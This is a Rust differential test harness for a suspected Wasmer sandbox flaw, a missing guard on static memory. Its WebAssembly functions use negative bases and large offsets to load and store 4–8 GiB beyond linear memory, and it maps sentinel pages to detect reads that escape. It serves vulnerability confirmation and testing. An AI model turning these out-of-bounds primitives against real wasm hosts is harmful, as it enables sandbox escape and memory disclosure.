// Differential harness for CWA-2026-006 candidate: missing static-memory guard
// (Wasmer PR #6879 / internal#5). Tests the [6GiB, 8GiB) window with sentinel
// mappings. Usage: sp437 singlepass | sp437 cranelift

use std::io::Write;
use wasmer::{Instance, Module, Store, Value};

const WAT: &str = r#"
(module
  (memory (export "memory") 1 512)

  (func (export "load-at-4gib") (result i64)
    (local $base i32)
    (local.set $base (i32.const -2147483648))
    (i64.load offset=2147483648 (local.get $base)))

  (func (export "load-at-5gib") (result i64)
    (local $base i32)
    (local.set $base (i32.const -1073741824))
    (i64.load offset=2147483648 (local.get $base)))

  (func (export "load-at-6gib") (result i64)
    (local $base i32)
    (local.set $base (i32.const -2147483647))
    (i64.load offset=4294967295 (local.get $base)))

  (func (export "load-at-7gib") (result i64)
    (local $base i32)
    (local.set $base (i32.const -1073741823))
    (i64.load offset=4294967295 (local.get $base)))

  (func (export "load-at-8gib") (result i64)
    (local $base i32)
    (local.set $base (i32.const -1))
    (i64.load offset=4294967295 (local.get $base)))

  (func (export "store-at-7gib") (param i64)
    (local $base i32)
    (local.set $base (i32.const -1073741823))
    (i64.store offset=4294967295 (local.get $base) (local.get 0)))
)
"#;

const TARGETS: &[(&str, u64)] = &[
    ("load-at-4gib", 0x1_0000_0000),
    ("load-at-5gib", 0x1_4000_0000),
    ("load-at-6gib", 0x1_8000_0000),
    ("load-at-7gib", 0x1_C000_0000),
    ("load-at-8gib", 0x1_FFFF_FFFE),
];

fn log(s: String) {
    println!("{s}");
    let _ = std::io::stdout().flush();
}

fn run_with_engine(name: &str, store: &mut Store, module: &Module) {
    log(format!("==== engine: {name} ===="));
    let instance = match Instance::new(store, module, &wasmer::imports! {}) {
        Ok(i) => i,
        Err(e) => {
            log(format!("instantiate error: {e}"));
            return;
        }
    };
    let memory = instance.exports.get_memory("memory").unwrap();
    let base = memory.view(store).data_ptr() as usize;
    log(format!("memory base = {base:#x}"));

    for (fname, target) in TARGETS {
        let addr = base.wrapping_add(*target as usize);
        let page = addr & !0xfff;
        log(format!("[{fname}] target={target:#x} addr={addr:#x}"));
        if *target >= 0x1_8000_0000 {
            let p = unsafe {
                libc::mmap(
                    page as *mut libc::c_void,
                    0x1000,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_PRIVATE | libc::MAP_ANONYMOUS | libc::MAP_FIXED_NOREPLACE,
                    -1,
                    0,
                )
            };
            if p as usize == page {
                let slot = (addr & 0xff8) as *mut u64;
                unsafe { *slot = 0x4141_4141_4141_4141 };
                log(format!("sentinel placed at {:#x}", page));
            } else {
                log(format!(
                    "sentinel mmap at {:#x} failed (ret={:#x}, errno={})",
                    page,
                    p as usize,
                    unsafe { *libc::__errno_location() }
                ));
            }
        }

        let func = instance.exports.get_function(fname).unwrap();
        log(format!("calling {fname} ..."));
        let res = func.call(store, &[]);
        match res {
            Ok(vals) => {
                let v = match vals.first() {
                    Some(Value::I64(x)) => format!("{x:#x}"),
                    other => format!("{other:?}"),
                };
                log(format!("{fname:>14} (target {:#x}): OK value={}", *target, v));
            }
            Err(e) => log(format!("{fname:>14} (target {:#x}): TRAP: {}", *target, e)),
        }
    }
}

// Harness-only stub: Wasmer 4.x references `__rust_probestack`, which modern Rust
// toolchains no longer export. Not used by these small test functions.
#[no_mangle]
pub extern "C" fn __rust_probestack() {}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let mode = args.get(1).cloned().unwrap_or_else(|| "singlepass".into());
    let only_target: Option<usize> = args.get(2).and_then(|s| s.parse().ok());
    let module_bytes = wat::parse_str(WAT).unwrap();

    let mut store: Store = match mode.as_str() {
        "singlepass" => Store::new(wasmer::Singlepass::new()),
        "cranelift" => Store::new(wasmer::Cranelift::default()),
        other => panic!("unknown mode {other}"),
    };
    let module = Module::new(&store, &module_bytes).unwrap();

    if let Some(idx) = only_target {
        let (fname, target) = TARGETS[idx];
        log(format!("==== engine: {mode}-4.3.7 target={fname} ===="));
        run_single(&mut store, &module, fname, target);
    } else {
        run_with_engine(&format!("{mode}-4.3.7"), &mut store, &module);
    }
}

fn run_single(store: &mut Store, module: &Module, fname: &str, target: u64) {
    let instance = Instance::new(store, module, &wasmer::imports! {}).unwrap();
    let memory = instance.exports.get_memory("memory").unwrap();
    let base = memory.view(store).data_ptr() as usize;
    log(format!("memory base = {base:#x}"));
    let addr = base.wrapping_add(target as usize);
    let page = addr & !0xfff;
    if target >= 0x1_8000_0000 {
        let p = unsafe {
            libc::mmap(
                page as *mut libc::c_void,
                0x1000,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS | libc::MAP_FIXED_NOREPLACE,
                -1,
                0,
            )
        };
        log(format!("mmap {page:#x} ret={:#x}", p as usize));
    }
    let func = instance.exports.get_function(fname).unwrap();
    log(format!("calling {fname} at target {target:#x} ..."));
    match func.call(store, &[]) {
        Ok(vals) => {
            let v = match vals.first() {
                Some(Value::I64(x)) => format!("{x:#x}"),
                other => format!("{other:?}"),
            };
            log(format!("{fname}: OK value={v}"));
        }
        Err(e) => log(format!("{fname}: TRAP: {e}")),
    }
}
